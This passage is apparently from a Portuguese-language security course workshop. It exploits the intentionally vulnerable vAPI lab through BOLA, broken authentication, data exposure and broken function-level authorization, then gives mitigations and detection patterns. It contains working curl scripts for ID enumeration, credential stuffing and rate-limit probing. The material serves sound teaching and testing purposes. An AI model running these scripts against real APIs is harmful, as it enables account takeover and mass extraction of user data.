  echo "=== API1: BOLA — acessando ID 1 (outro usuario) com MEU token ===" &&
  curl -s http://172.18.0.40/vapi/api1/user/1 \
    -H "Authorization-Token: $TOKEN_API1" \
    | tee /tmp/evidencias/workshop-06/08-api1-bola-id1.txt
'
```

**Resultado esperado (vulnerabilidade confirmada):**

```json
{"id":1,"username":"michaels","name":"Michael Scott","course":"flag{api1_d0cd9be2324cc237235b}"}
```

Para reforcar o achado, mantemos exatamente a mesma autenticacao e alteramos apenas o ID na URL. Se a API estiver vulneravel, cada novo ID retorna dados de outro usuario configurado no vAPI:

```bash
docker exec atacante_kali sh -lc '
  . /tmp/evidencias/workshop-06/api1-contexto.env
  echo "=== API1: BOLA — acessando IDs 2 e 3 com o MESMO token ==="
  for id in 2 3; do
    curl -s http://172.18.0.40/vapi/api1/user/$id \
      -H "Authorization-Token: $TOKEN_API1"
    echo
  done | tee /tmp/evidencias/workshop-06/09-api1-bola-outros-ids.txt
'
```

**Resultado esperado:**

```json
{"id":2,"username":"meredithp","name":"Meredith Palmer","course":"The Subtle art of not giving a F***"}
{"id":3,"username":"pambeese","name":"Pam Beesly","course":"Sketching for Dummies"}
```

**Analise:** o `Authorization-Token` enviado pertence ao usuario criado por nos — ele apenas prova "sou um usuario autenticado", nao "tenho permissao sobre o objeto 1", `2` ou `3`. Com a mesma autenticacao, somente trocando o ID do usuario na URL, conseguimos extrair informacoes de usuarios configurados no vAPI. O metodo `show($id)` do `API1UsersController` busca o registro direto por `id` da URL (`where('id', $id)->first()`), **sem nenhuma comparacao com o usuario do token**. Resultado: qualquer credencial valida acessa qualquer `id` — incluindo o campo `course` do usuario `michaels`, que neste laboratorio contem a flag da fase.

**Flag obtida:** `flag{api1_d0cd9be2324cc237235b}`

### Passo 5.4: Enumerar todos os IDs — impacto

Com o mesmo token, iteramos os IDs de `1` a `10` sistematicamente:

```bash
docker exec atacante_kali sh -lc '
  . /tmp/evidencias/workshop-06/api1-contexto.env
  echo "=== API1: Enumerando IDs 1 a 10 ===" &&
  for id in $(seq 1 10); do
    RESP=$(curl -s http://172.18.0.40/vapi/api1/user/$id -H "Authorization-Token: $TOKEN_API1")
    echo "ID $id -> $RESP"
  done | tee /tmp/evidencias/workshop-06/10-api1-enum-ids.txt
'
```

**Resultado esperado:**

```text
ID 1 -> {"id":1,"username":"michaels","name":"Michael Scott","course":"flag{api1_d0cd9be2324cc237235b}"}
ID 2 -> {"id":2,"username":"meredithp","name":"Meredith Palmer","course":"The Subtle art of not giving a F***"}
ID 3 -> {"id":3,"username":"pambeese","name":"Pam Beesly","course":"Sketching for Dummies"}
ID 4 -> {"id":4,"username":"jimhalp","name":"Jim Halpert","course":"Art of Pranks"}
```

**Impacto:** com UM unico par usuario/senha — incluindo o que acabamos de criar para nos mesmos — um atacante itera sequencialmente o `id` de `/api1/user/{id}` e extrai `username`, `name` e `course` de **todos** os usuarios cadastrados, sem qualquer relacao com sua propria conta. Em uma base de producao com milhares de registros, o mesmo `for id in $(seq 1 N)` exfiltra a base inteira — e, neste laboratorio, vaza diretamente a flag armazenada no campo `course` do usuario `michaels`.

---

## 6. Fase 4: API2 — Broken Authentication

### O que e Broken Authentication em APIs

A categoria API2 cobre falhas no mecanismo de autenticacao da API: ausencia de rate limiting (permite brute force e credential stuffing), tokens previsiveis, ausencia de expiracao de token, transmissao insegura de credenciais e implementacao incorreta de fluxos de autenticacao.

Neste workshop, demonstramos **Credential Stuffing** — tecnica onde uma lista de pares usuario/senha conhecidos (vazados de outros sistemas) e testada sistematicamente contra o endpoint de login da API.

### Passo 6.1: Identificar endpoint de autenticacao

```bash
docker exec atacante_kali sh -lc '
  echo "=== API2: Reconhecimento do endpoint de login ===" &&
  curl -si -X POST http://172.18.0.40/vapi/api2/user/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"teste@teste.com\",\"password\":\"errada\"}" \
    | tee /tmp/evidencias/workshop-06/11-api2-login-errado.txt
'
```

**Resultado esperado (exemplo; data e cabecalhos HTTP podem variar):**

```text
HTTP/1.1 401 Unauthorized
X-Powered-By: PHP/7.4.33
Content-Type: application/json

{"success":"false","cause":"usernameOrPasswordIncorrect"}
```

**Analise:** observe dois pontos criticos:

1. A mensagem `usernameOrPasswordIncorrect` e identica para email inexistente e senha incorreta — isso e bom (evita enumeracao de usuarios pela mensagem de erro).
2. **Nao ha cabecalho de rate limiting** (`X-RateLimit-*`, `Retry-After`) na resposta — nada sinaliza limite de tentativas. Vamos confirmar isso de forma sistematica no Passo 6.3.

### Passo 6.2: Credential Stuffing com lista de senhas

Um cenario tipico de *credential stuffing*: o pentester recebe (ou simula) uma lista de pares email/senha vazados de OUTROS servicos, e testa cada par contra o login desta API. A maioria falha, mas usuarios que reutilizam senha entre servicos sao comprometidos:

```bash
docker exec atacante_kali sh -lc '
  if [ -f /tmp/evidencias/workshop-06/api1-contexto.env ]; then
    . /tmp/evidencias/workshop-06/api1-contexto.env
  fi
  cat > /tmp/credenciais.txt << EOF
savanna48@ortiz.com:senha123
hauck.aletha@yahoo.com:senha123
hauck.aletha@yahoo.com:kU-wDE7r
harber.leif@beatty.info:123456
admin@vapi.com:admin
${USER_API1:-estudante1_1781480000}:Pass123!
EOF
  echo "Lista criada:"
  cat /tmp/credenciais.txt
'
```

**Observacao:** a ultima linha reaproveita o usuario criado na API1, quando o arquivo `api1-contexto.env` existir. O valor real do username muda a cada execucao (`estudante1_<timestamp>`). Incluimos essa credencial para mostrar continuidade entre as fases e tambem para testar uma hipotese importante: uma conta criada em um modulo da API nao deve, automaticamente, autenticar em outro modulo com base de usuarios diferente.

Em laboratorios e testes autorizados, listas de usuarios, senhas e pares usuario/senha tambem podem ser obtidas de wordlists publicas disponiveis na internet, inclusive em repositorios no GitHub. O ponto importante e manter o uso restrito ao escopo permitido e registrar no relatorio qual lista foi utilizada, de onde veio e por que ela foi escolhida.

Agora executamos o credential stuffing:

```bash
docker exec atacante_kali sh -lc '
  echo "=== API2: Credential Stuffing ===" &&
  while IFS=: read EMAIL SENHA; do
    RESP=$(curl -s -X POST http://172.18.0.40/vapi/api2/user/login \
      -H "Content-Type: application/json" \
      -d "{\"email\":\"$EMAIL\",\"password\":\"$SENHA\"}")
    SUCCESS=$(echo $RESP | jq -r ".success" 2>/dev/null)
    if [ "$SUCCESS" = "true" ]; then
      echo "[SUCESSO] $EMAIL:$SENHA -> $RESP"
      TOKEN2=$(echo "$RESP" | jq -r ".token")
      echo "Authorization-Token=$TOKEN2" > /tmp/evidencias/workshop-06/token-api2.txt
    else
      echo "[FALHA]   $EMAIL:$SENHA"
    fi
  done < /tmp/credenciais.txt | tee /tmp/evidencias/workshop-06/12-api2-credential-stuffing.txt
'
```

**Componentes do comando:**

- `while IFS=: read EMAIL SENHA`: le cada linha do arquivo de credenciais, separando em EMAIL e SENHA pelo delimitador `:`.
- `jq -r ".success"`: extrai o campo `success` da resposta JSON. **Atencao:** nesta API o campo e a STRING `"true"`/`"false"`, nao um booleano JSON.
- Condicional `if [ "$SUCCESS" = "true" ]`: detecta autenticacao bem-sucedida.
- `echo "Authorization-Token=$TOKEN2" > .../token-api2.txt`: salva o token obtido para reutilizacao no passo seguinte.

**Resultado esperado (exemplo; o token retornado pode variar conforme o estado do laboratorio):**

```text
[FALHA]   savanna48@ortiz.com:senha123
[FALHA]   hauck.aletha@yahoo.com:senha123
[SUCESSO] hauck.aletha@yahoo.com:kU-wDE7r -> {"success":"true","token":"1Nkoz6quzJiis1SEonJeSxwkXTzSzcULofbL9O7KPz6_sKGkUcQDzoNfI5aA"}
[FALHA]   harber.leif@beatty.info:123456
[FALHA]   admin@vapi.com:admin
[FALHA]   estudante1_1781480000:Pass123!
```

**Analise:** o par `hauck.aletha@yahoo.com:kU-wDE7r` — supostamente vazado de outro servico — funciona aqui. Ja o usuario criado na API1 falha, o que e esperado: ele pertence ao fluxo de teste da API1, nao necessariamente a base de autenticacao da API2. Essa diferenca reforca a importancia de tratar cada modulo, endpoint e fluxo de autenticacao como uma superficie propria. O `token` retornado **tambem nao e JWT**: e uma string aleatoria opaca (`1Nkoz6q...`), sem `Bearer` e sem payload decodificavel. Vamos usa-lo para demonstrar o segundo problema desta categoria: o token nao limita o acesso ao proprio usuario.

#### Token obtido -> exposicao de TODOS os usuarios via `/user/details`

```bash
docker exec atacante_kali sh -lc '
  TOKEN2=$(cat /tmp/evidencias/workshop-06/token-api2.txt | cut -d= -f2)
  echo "=== API2: /user/details com o token obtido ===" &&
  curl -s http://172.18.0.40/vapi/api2/user/details \
    -H "Authorization-Token: $TOKEN2" \
    | tee /tmp/evidencias/workshop-06/12b-api2-details.txt
'
```

**Resultado esperado:**

```json
[
  {"id":1,"email":"savanna48@ortiz.com","name":"Evelyn","token":"Fp0r1mty_gxK9DRZ5IUw3sX2enQ6rau68M6YGyoqR3XoBG13wtSbvmdaK5CB","address":"10th Downing","city":"Mesport","country":"USA"},
  {"id":2,"email":"hauck.aletha@yahoo.com","name":"Tara","token":"1Nkoz6quzJiis1SEonJeSxwkXTzSzcULofbL9O7KPz6_sKGkUcQDzoNfI5aA","address":"flag{api2_6bf2beda61e2a1ab2d0a}","city":"Delhi","country":"India"},
  {"id":3,"email":"harber.leif@beatty.info","name":"Joyce","token":"sLqs17RjmdlWoBP2ONdAPP8WtIVNwlyz_qzLwhmJGboWD_asFICYggcE3bPi","address":"San Jose","city":"California","country":"USA"}
]
```

**Analise:** com o token de Tara, o endpoint `/api2/user/details` retornou o **array completo dos 3 usuarios** — incluindo os `token` de Evelyn e Joyce, que Tara nunca deveria poder ver. O campo `address` de Tara contem a flag desta fase.

**Flag obtida:** `flag{api2_6bf2beda61e2a1ab2d0a}`

Isso e "Broken Authentication" em duas camadas: (1) credential stuffing funciona porque nao ha rate limiting nem MFA (Passo 6.3); e (2) mesmo um token "valido" de um unico usuario expoe os tokens e dados de TODOS os usuarios — o servidor autentica o cabecalho `Authorization-Token`, mas nao usa o usuario autenticado para filtrar a resposta.

### Passo 6.3: Analisar ausencia de rate limiting

Para comprovar a ausencia de controle, execute 50 tentativas consecutivas e verifique se a API bloqueia:

```bash
docker exec atacante_kali sh -lc '
  echo "=== API2: Testando ausencia de rate limiting (50 requisicoes) ===" &&
  for i in $(seq 1 50); do
    STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST http://172.18.0.40/vapi/api2/user/login \
      -H "Content-Type: application/json" \
      -d "{\"email\":\"teste@teste.com\",\"password\":\"errada$i\"}")
    printf "Tentativa %02d -> HTTP %s\n" $i $STATUS
  done | tee /tmp/evidencias/workshop-06/13-api2-rate-limit-test.txt
'
```

**Resultado esperado (vulnerabilidade confirmada):**

```text
Tentativa 01 -> HTTP 401
Tentativa 02 -> HTTP 401
Tentativa 03 -> HTTP 401
...
Tentativa 50 -> HTTP 401
```

**Analise:** todas as 50 tentativas retornam `401` (credenciais invalidas) — **nunca** um `429` (Too Many Requests). Isso confirma a ausencia de rate limiting: um atacante pode tentar milhares de combinacoes (incluindo as do Passo 6.2) sem ser bloqueado, atrasado ou diferenciado de um usuario legitimo.

### Passo 6.4: Interpretar impacto e evidencia

**Impacto:** sem rate limiting, um atacante pode executar ataques de credential stuffing com listas de milhoes de pares usuario/senha vazados (disponíveis publicamente em bases como RockYou, Collection #1, etc.) ate encontrar credenciais reutilizadas — como `hauck.aletha@yahoo.com:kU-wDE7r` neste laboratorio. Pior: uma vez com QUALQUER credencial valida, o endpoint `/api2/user/details` (Passo 6.2) expoe os dados — incluindo `token` de sessao — de **toda a base de usuarios**, transformando uma unica conta comprometida em comprometimento total da base.

Vale registrar tambem: a tabela `a_p_i2_users` mostra que Tara (`hauck.aletha@yahoo.com`) e Joyce (`harber.leif@beatty.info`) compartilham a **mesma senha** (`kU-wDE7r`) — reuso de senha entre contas, exatamente o padrao que credential stuffing explora.

---

## 7. Fase 5: API3 — Broken Object Property Level Authorization (Excessive Data Exposure)

### O que e Excessive Data Exposure

Esta categoria ocorre quando a API retorna mais dados do que o necessario para o cliente, confiando que a interface do usuario (app mobile, SPA) vai filtrar o que exibir. O problema e que um atacante interceptando a resposta HTTP recebe todos os campos, incluindo dados sensiveis que a UI esconde mas a API envia.

### Passo 7.1: Requisitar recurso e analisar resposta completa

```bash
docker exec atacante_kali sh -lc '
  echo "=== API3: GET /api3/comment (sem autenticacao) ===" &&
  curl -si http://172.18.0.40/vapi/api3/comment \
    | tee /tmp/evidencias/workshop-06/14-api3-comment-full.txt
'
```

**Resultado esperado (exemplo; data e cabecalhos HTTP podem variar):**

```text
HTTP/1.1 200 OK
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Content-Type: application/json

[{"id":1,"postid":"1","deviceid":"flag{api3_0bad677bfc504c75ff72}","latitude":"45.5426274","longitude":"-122.7944111","commenttext":"THIS POST IS SH***Y","username":"baduser007"}]
```

**Analise:** o endpoint `GET /vapi/api3/comment` (rota `API3CommentsController@show`) responde com **HTTP 200 sem qualquer cabecalho de autenticacao** — nenhum `Authorization-Token`, nenhuma sessao. Diferente das rotas `api1`/`api5` (Fases 3 e 6), aqui nem existe verificacao de presenca de cabecalho. A resposta e um array JSON na raiz (sem envelope `success`/`data`) contendo o objeto `comment` completo, incluindo campos que um app de "comentarios em posts" normalmente nao exibiria publicamente:

- `deviceid`: identificador do dispositivo que originou o comentario.
- `latitude` / `longitude`: coordenadas GPS precisas associadas ao comentario.
- `username`: usuario que postou.
- `commenttext`: conteudo do comentario.

### Passo 7.2: Extrair campos sensiveis com jq

```bash
docker exec atacante_kali sh -lc '
  echo "=== API3: Extraindo deviceid, latitude e longitude ===" &&
  curl -s http://172.18.0.40/vapi/api3/comment \
    | jq -r ".[] | {id, username, deviceid, latitude, longitude}" \
    | tee /tmp/evidencias/workshop-06/15-api3-campos-sensiveis.txt
'
```

**Flags do jq utilizadas:**

- `-r`: saida raw.
- `.[]`: itera sobre os elementos do array — a resposta e um array na raiz, sem envelope `data`.
- `{id, username, deviceid, latitude, longitude}`: seleciona apenas os campos de interesse.

**Resultado esperado:**

```json
{
  "id": 1,
  "username": "baduser007",
  "deviceid": "flag{api3_0bad677bfc504c75ff72}",
  "latitude": "45.5426274",
  "longitude": "-122.7944111"
}
```

**Flag obtida:** `flag{api3_0bad677bfc504c75ff72}` (campo `deviceid`)

### Passo 7.3: Interpretar impacto e evidencia

**Analise:** o campo `deviceid` deveria, no maximo, ser usado internamente pelo backend (deduplicacao, antifraude) — nao devolvido na resposta publica de um endpoint de comentarios. Da mesma forma, `latitude`/`longitude` permitem reconstruir a localizacao exata de onde o comentario foi publicado, um dado que o autor (`baduser007`) provavelmente nao espera estar disponivel a qualquer visitante.

**Impacto:** mesmo que o aplicativo cliente exiba na tela apenas `username` e `commenttext`, qualquer pessoa com `curl` e a URL recebe TAMBEM o `deviceid` (identificador de dispositivo — dado pessoal sob a LGPD) e a geolocalizacao precisa do autor — **sem login, sem token, sem rate limiting**. Em producao, agregando varios comentarios do mesmo `deviceid`/`username`, um atacante poderia rastrear o deslocamento de um usuario ao longo do tempo e correlacionar identidade com localizacao, violando expectativas de privacidade e a LGPD (geolocalizacao e identificadores de dispositivo sao dados pessoais).

---

## 8. Fase 6: API5 — Broken Function Level Authorization

### O que e Broken Function Level Authorization

Esta categoria ocorre quando a API nao verifica se o usuario tem permissao para executar **determinada funcao ou metodo**, mesmo que esteja autenticado. Tipicamente, rotas administrativas (deletar usuario, listar todos os registros, alterar papel) ficam acessiveis a qualquer token valido.

### Passo 8.1: Identificar endpoint administrativo sem autenticacao

```bash
docker exec atacante_kali sh -lc '
  echo "=== API5: Tentando listar todos os usuarios SEM autenticacao ===" &&
  curl -si http://172.18.0.40/vapi/api5/users \
    | tee /tmp/evidencias/workshop-06/16-api5-sem-auth.txt
'
```

**Resultado esperado:**

```text
HTTP/1.1 403 Forbidden
X-Powered-By: PHP/7.4.33
Content-Type: application/json

{"success":"false","cause":"authHeaderNotSet"}
```

**Analise:** sem o cabecalho `Authorization-Token`, a rota `/api5/users` retorna `403`. Isso parece seguro a primeira vista — mas a pergunta certa nao e "a rota exige autenticacao?" e sim "**qualquer** usuario autenticado pode chamar esta rota administrativa?". Respondemos isso no Passo 8.2.

### Passo 8.2: Criar usuario comum e acessar a funcao "admin"

Antes de criar o usuario, precisamos entender de onde veio a estrutura do JSON. Neste laboratorio, o payload foi extraido primeiro da **documentacao publica da propria aplicacao**, exposta pela interface ReDoc em `http://172.18.0.40/vapi/`. No vAPI, essa informacao tambem pode ser confirmada de duas formas complementares: pela colecao Postman do laboratorio e, quando temos acesso ao codigo-fonte, pela leitura das rotas, controller e model.

```bash
cd ~/lab-seguranca

grep -n "api5/user" vapi/vapi/routes/api.php

grep -n 'protected $fillable' vapi/vapi/app/Models/API5Users.php

sed -n "/function store/,/}/p" vapi/vapi/app/Http/Controllers/API5UsersController.php
```

**Resultado esperado (resumido):**

```text
Route::get('api5/user/{id}','App\Http\Controllers\API5UsersController@show');
Route::post('api5/user','App\Http\Controllers\API5UsersController@store');

protected $fillable = ['username','name','address','mobileno','password'];

public function store(Request $request)
{
    return API5Users::create(json_decode($request->getContent(), true));
}
```

**Analise:** a rota `POST /api5/user` chama o metodo `store()`. Esse metodo pega o corpo JSON bruto da requisicao, converte para array e entrega diretamente ao model `API5Users::create()`. O model, por sua vez, informa quais campos podem ser preenchidos em massa: `username`, `name`, `address`, `mobileno` e `password`. Por isso o payload de criacao precisa conter exatamente esses atributos. A senha e usada para gerar o `Authorization-Token`, mas nao aparece na resposta porque o model define `password` como campo oculto (`protected $hidden`).

Criamos entao um usuario comum no modulo API5 e registramos seu ID real e `Authorization-Token` (mesmo padrao da Fase 3 — sem rota de login, autenticacao via `Authorization-Token`):

```bash
docker exec atacante_kali sh -lc '
  USER_API5="estudante5_$(date +%s)"
  PASS_API5="Pass123!"
  echo "=== API5: Criando usuario comum ==="
  RESP=$(curl -s -X POST http://172.18.0.40/vapi/api5/user \
    -H "Content-Type: application/json" \
    -d "{\"name\":\"Estudante Cinco\",\"username\":\"$USER_API5\",\"password\":\"$PASS_API5\",\"address\":\"Rua Teste 1\",\"mobileno\":\"11999999999\"}")
  echo "$RESP" | tee /tmp/evidencias/workshop-06/17-api5-create-user.txt
  ID_API5=$(echo "$RESP" | jq -r ".id")
  TOKEN_API5=$(printf "%s" "$USER_API5:$PASS_API5" | base64)
  {
    echo "USER_API5=$USER_API5"
    echo "ID_API5=$ID_API5"
    echo "TOKEN_API5=$TOKEN_API5"
  } | tee /tmp/evidencias/workshop-06/api5-contexto.env
'
```

**Resultado esperado (exemplo; timestamp, token e `id` podem variar conforme a execucao):**

```text
{"name":"Estudante Cinco","username":"estudante5_1781480000","address":"Rua Teste 1","mobileno":"11999999999","id":4}
USER_API5=estudante5_1781480000
ID_API5=4
TOKEN_API5=ZXN0dWRhbnRlNV8xNzgxNDgwMDAwOlBhc3MxMjMh
```

Antes de explorar o BFLA, vale confirmar um ponto de **contraste**: `GET /api5/user/{id}` (acesso a um objeto especifico) ESTA corretamente protegido:

```bash
docker exec atacante_kali sh -lc '
  . /tmp/evidencias/workshop-06/api5-contexto.env
  {
    echo "=== API5: acessando MEU objeto (id $ID_API5) ==="
    curl -s http://172.18.0.40/vapi/api5/user/$ID_API5 -H "Authorization-Token: $TOKEN_API5"
    echo
    echo "=== API5: tentando acessar id 1 (admin) via /user/{id} ==="
    curl -s http://172.18.0.40/vapi/api5/user/1 -H "Authorization-Token: $TOKEN_API5"
    echo
  } | tee /tmp/evidencias/workshop-06/18-api5-user-scoped.txt
'
```

**Resultado esperado (exemplo; use o `ID_API5` real gravado em `api5-contexto.env`):**

```text
{"id":4,"username":"estudante5_1781480000","name":"Estudante Cinco","address":"Rua Teste 1","mobileno":"11999999999"}
{"success":"false","cause":"usernameOrPasswordIncorrect"}
```

**Analise:** `GET /api5/user/{id}` (metodo `show`) valida `id` **e** credenciais em conjunto — ao tentar o `id` 1 com as credenciais do usuario comum criado por nos, a API responde o mesmo erro generico de credenciais invalidas. Esta rota **nao** tem BOLA.

Agora a funcao "administrativa" — `GET /api5/users` (sem `{id}`, metodo `showall`) — com o **mesmo token** de usuario comum:

```bash
docker exec atacante_kali sh -lc '
  . /tmp/evidencias/workshop-06/api5-contexto.env
  echo "=== API5: BFLA — /api5/users (funcao admin) com token de usuario COMUM ===" &&
  curl -s http://172.18.0.40/vapi/api5/users -H "Authorization-Token: $TOKEN_API5" \
    | tee /tmp/evidencias/workshop-06/19-api5-bfla.txt
'
```

**Resultado esperado (vulnerabilidade confirmada):**

```json
[
  {"id":1,"username":"admin","name":"Admin User","address":"flag{api5_76dd990a97ff1563ae76}","mobileno":"8080808080"},
  {"id":2,"username":"checkuser5","name":"checkuser5","address":"","mobileno":""},
  {"id":3,"username":"alunoapi5","name":"alunoapi5","address":"","mobileno":""},
  {"id":4,"username":"estudante5_1781480000","name":"Estudante Cinco","address":"Rua Teste 1","mobileno":"11999999999"}
]
```

**Flag obtida:** `flag{api5_76dd990a97ff1563ae76}` (campo `address` do usuario `admin`, id 1)

### Passo 8.3: Interpretar impacto e evidencia

**Analise:** o metodo `showall()` do `API5UsersController` exige apenas um `Authorization-Token` valido — a mesma verificacao do `CustomHeaderAuth` usada em `show($id)` — mas **nao verifica nenhum papel/permissao** do usuario autenticado. Resultado: uma conta comum criada ha segundos por nos mesmos lista a tabela `a_p_i5_users` inteira, incluindo o registro do `admin` (id 1) com seu campo `address` contendo a flag.

O contraste entre `show($id)` (Passo 8.2, corretamente restrito ao proprio registro) e `showall()` (sem nenhuma restricao de papel) e o nucleo do **API5 — Broken Function Level Authorization**: a mesma API aplica controle de objeto em uma rota e esquece de aplicar controle de **funcao** em outra.

**Impacto:** qualquer conta — incluindo uma criada por um atacante externo via `POST /api5/user`, sem qualquer aprovacao — consegue, com uma unica chamada `GET /api5/users`, extrair toda a tabela de usuarios do modulo, incluindo o registro do administrador. Em um cenario real, a mesma falta de verificacao de papel tenderia a se repetir em rotas irmãs de escrita (`PUT`/`DELETE /api5/user/{id}`), permitindo que um usuario comum altere ou remova contas de outros usuarios, incluindo a do administrador.

---

## 9. Mitigacao, Deteccao e Hardening

### 9.1 Mitigacoes tecnicas por categoria

| Categoria | Vulnerabilidade | Mitigacao tecnica |
|---|---|---|
| **API1 - BOLA** | `GET /api1/user/{id}` retorna qualquer usuario para qualquer credencial valida | Validar no backend se o usuario identificado pelo `Authorization-Token` corresponde ao `id` solicitado na URL antes de retornar o registro |
| **API2 - Broken Auth** | Sem rate limiting no login; `/api2/user/details` retorna dados de TODOS os usuarios para qualquer token valido | Implementar `throttle` por IP e por usuario (ex: max 5 tentativas/minuto, retornando `429 Too Many Requests`); escopar `/user/details` para retornar apenas o registro do usuario autenticado |
| **API3 - Data Exposure** | `GET /api3/comment` retorna `deviceid` e geolocalizacao precisa sem qualquer autenticacao | Exigir autenticacao para a rota e usar DTOs (Data Transfer Objects) ou serializers que exponham apenas os campos necessarios para cada contexto |
| **API5 - Broken Function** | `GET /api5/users` (showall) nao verifica papel/permissao do usuario autenticado | Implementar middleware de verificacao de papel (`role`/`is_admin`) em cada rota administrativa; principio do minimo privilegio |

### 9.2 Cabecalhos de seguranca ausentes (API8 correlato)

Todos os endpoints do vAPI carecem dos seguintes cabecalhos, que devem ser adicionados em producao:

```text
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'none'
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-RateLimit-Limit: 5
X-RateLimit-Remaining: 4
X-RateLimit-Reset: 1700000060
```

### 9.3 Deteccao de ataques contra APIs

Para monitorar comportamento anomalo nos containers do vAPI:

```bash
docker logs --tail 200 lab_vapi_www 2>&1 | grep -Ei "POST|GET|401|403|500" | tail -30
```

Padroes compativeis com os ataques deste workshop:

- Multiplos `POST /vapi/api2/user/login` em curto intervalo, todos com `401` — credential stuffing.
- Sequencia de `GET /vapi/api1/user/1`, `/user/2`, `/user/3`... com o mesmo `Authorization-Token` — enumeracao BOLA.
- `GET /vapi/api3/comment` sem cabecalho `Authorization-Token` — coleta de dados sem autenticacao.
- Acesso a `/vapi/api5/users` (sem `{id}`) com token de usuario recem-criado — Broken Function Level.

**Analise:** em producao, esses eventos devem ser correlacionados em SIEM com alertas de limiar. A ausencia de logging estruturado no vAPI tambem e, por si so, um achado relacionado a **API10 — Insufficient Logging & Monitoring**.

---

## 10. Encerramento

### 10.1 Modelo minimo de relatorio do aluno

| Secao | Conteudo esperado |
|---|---|
| Identificacao | Nome, turma, data, host e container atacante |
| Escopo | IP/URL do vAPI e categorias testadas |
| Metodologia | Sequencia: reconhecimento -> API1 -> API2 -> API3 -> API5 |
| API1 — BOLA | ID explorado, usuario acessado, campos expostos, flag obtida, evidencia curl |
| API2 — Broken Auth | Credencial descoberta via credential stuffing, ausencia de rate limit comprovada, exposicao via `/user/details`, flag obtida |
| API3 — Data Exposure | Campos sensiveis retornados sem autenticacao (`deviceid`, geolocalizacao), impacto LGPD, flag obtida |
| API5 — Broken Function | Authorization-Token utilizado, contraste `show` vs `showall`, dados retornados, flag obtida |
| Impacto | Classificacao de severidade (sugerido: CVSS v3) |
| Mitigacao | Correcao tecnica para cada categoria |
| Conclusao | Diferenca entre testes de API e testes web tradicionais |

### 10.2 Sintese final do workshop

Este workshop demonstrou que APIs REST exigem uma abordagem de teste fundamentalmente diferente de aplicacoes web tradicionais. Scanners automaticos como Nikto e OWASP ZAP tem retorno limitado porque nao entendem a logica de negocio da API — nao sabem quais IDs sao validos, nao conseguem inferir papeis de usuarios e nao testam cenarios de autorizacao entre objetos.

O trabalho manual com `curl` e `jq` e, por isso, insubstituivel no teste de APIs. Cada requisicao conta uma historia: qual objeto foi acessado, por qual usuario, com qual resultado.

A licao central deste workshop:

```text
Em APIs, o controle de acesso nao e sobre
"o usuario esta logado?"
mas sobre
"este usuario tem permissao para acessar ESTE objeto ESPECIFICO?"
```

Essa distincao e o nucleo do BOLA e o erro mais comum em APIs modernas.

---

## 11. Referencias

As referencias abaixo sustentam a taxonomia, os nomes das categorias e o ambiente vulneravel utilizado neste workshop. A narrativa, os comandos, as evidencias e as analises praticas foram adaptados ao laboratorio local validado em aula.

- [OWASP API Security Top 10 2023](https://owasp.org/API-Security/editions/2023/en/0x11-t10/)
- [OWASP API1: Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- [OWASP API2: Broken Authentication](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/)
- [OWASP API3: Broken Object Property Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)
- [OWASP API5: Broken Function Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/)
- [vAPI - Vulnerable Adversely Programmed Interface](https://github.com/roottusk/vapi)

---

<p align="right">
  <sub></sub><br>
  <img src="https://hits.sh/github.com/charles-josiah/Aulas/blob/master/2026-04-Vulnerabilidades_e_Testes_de_Invasao/Workshops/06-OWASP_API_Security_Top10_com_vAPI.md.svg?label=leituras&color=eeeeee&labelColor=f5f5f5" alt="contador de leituras">
</p>
